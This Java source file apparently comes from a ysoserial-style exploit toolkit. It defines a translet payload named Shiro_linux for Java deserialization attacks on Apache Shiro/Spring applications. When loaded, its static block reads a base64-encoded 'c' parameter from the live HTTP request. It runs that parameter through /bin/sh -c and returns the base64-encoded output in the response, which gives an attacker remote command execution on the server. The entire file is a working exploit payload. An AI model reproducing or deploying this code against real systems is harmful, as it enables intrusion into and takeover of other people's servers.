package ysoserial.payloads.external;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.request.RequestAttributes;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.xml.bind.DatatypeConverter;
import java.io.InputStream;
import java.io.Serializable;
import java.util.Scanner;


public class Shiro_linux extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;

    static {
        try {
            // https://stackoverflow.com/questions/592123/is-there-a-static-way-to-get-the-httpservletrequest-of-the-current-request
            RequestAttributes requestAttributes = RequestContextHolder.getRequestAttributes();
            HttpServletRequest httprequest = ((ServletRequestAttributes) requestAttributes).getRequest();
            HttpServletResponse httpresponse = ((ServletRequestAttributes) requestAttributes).getResponse();

            // exexute shell to base64
            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));

            // String[] command = {"cmd", "/c", httprequest.getParameter("c")};
            // String[] command = {"/bin/sh", "-c", params};
            InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", params}).getInputStream();

            Scanner scan = new Scanner(in).useDelimiter("\\A");
            String d = scan.hasNext() ? scan.next() : "";

//            // return command result to base64
            String base64Str = "";
            base64Str = DatatypeConverter.printBase64Binary(d.getBytes());
            httpresponse.getWriter().write(base64Str);

//            // over http session
            httpresponse.getWriter().flush();
            httpresponse.getWriter().close();

        } catch (Exception e) {
            //  Block of code to handle errors
            e.getStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }


    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

}
